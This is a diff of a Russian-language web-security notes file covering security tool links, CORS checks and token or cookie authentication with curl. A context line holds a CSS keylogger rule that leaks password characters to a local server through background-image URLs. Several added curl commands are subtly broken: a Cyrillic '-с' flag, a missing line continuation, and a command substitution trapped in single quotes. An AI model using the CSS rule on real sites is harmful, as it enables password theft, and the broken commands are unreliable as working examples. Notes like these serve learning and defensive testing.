@@ -14,6 +14,11 @@
  * [оценка безопасности ПО](https://tproger.ru/translations/measuring-the-security-of-your-software/)
  * http://tproger.ru/tag/safe-code/
  * [Анализ уязвимостей процесса аутентификации](https://bmsdave.github.io/blog/auth-vulnerabilities/)
+ * []()
+ * https://owasp.org/www-community/Free_for_Open_Source_Application_Security_Tools
+ * artifactory https://jfrog.com/security-and-compliance/
+ * https://www.sonarqube.org/features/security/
+
 
 ```css
 input[type="password"][value$="A"] { background-image: url("http://localhost:3000/A"); }
@@ -72,16 +77,57 @@ body {
  ```
  * [заголовки http](https://www.w3.org/TR/cors/#syntax)
  * проверка
- ```bash
- curl -v 'http://8.8.8.8:8080/index.html' --data 'user=11111&pass=22222' -H 'Content-Type:application/x-www-form-urlencoded'
- curl -v 'http://8.8.8.8:8080/index.html?user=11111&pass=22222' -H 'Content-Type:application/json'
- ```
+	```bash
+		curl -v 'http://8.8.8.8:8080/index.html' --data 'user=11111&pass=22222' -H 'Content-Type:application/x-www-form-urlencoded'
+		curl -v 'http://8.8.8.8:8080/index.html?user=11111&pass=22222' -H 'Content-Type:application/json'
+	```
  * [сценарии атак на cors](https://www.securitylab.ru/analytics/498754.php)
  
 
 ##  авторизация и аутентификация
 
+ * простой запрос с авторизацией
+	```bash
+		curl -X 'POST' \
+		'https://some.domain.ru/api/getToken' \
+		-H 'accept: */*' \
+		-H 'Content-Type: application/json' \
+		-d '{ \
+		"username": "", \
+		"password": "" \
+		}' \
+		-o token.json
+
+		curl -X 'GET' \
+		'https://some.domain.ru/api/getSomeData' \
+		-H 'accept: text/plain'
+		-H 'Authorization: Bearer $(cat token.json)'
+	```
+ * простой запрос с авторизацией вариант 2
+	```bash
+		curl -X 'POST' \
+		'https://some.domain.ru/api/getCookie' \
+		-H 'accept: */*' \
+		-H 'Content-Type: application/json' \
+		-d '{ \
+		"username": "", \
+		"password": "" \
+		}' \
+		-с cookie.txt
+
+		curl -X 'GET' \
+		'https://some.domain.ru/api/getSomeData' \
+		-H 'accept: text/plain'
+		-b cookie.txt
+	```
  * [обзор видов авторизации](https://flowers-for-all.com/post/28443)
+ * локальный стенд с ssl(необходимо разрешить https://localhost:4200 в настройках CORS серверов)
+  ```bash
+    mkdir ./util
+    openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout ./util/nginx.key -out ./util/ssl.crt
+    npm run start:proxy:africa:ssl
+    # https://localhost:4200/
+  ```
  * JWT
 	* [Продвинутая JWT авторизация на React и Node js. Access, refresh, активация по почте](https://www.youtube.com/watch?v=fN25fMQZ2v0)
 		* access: 15 минут, хранится в localstorage
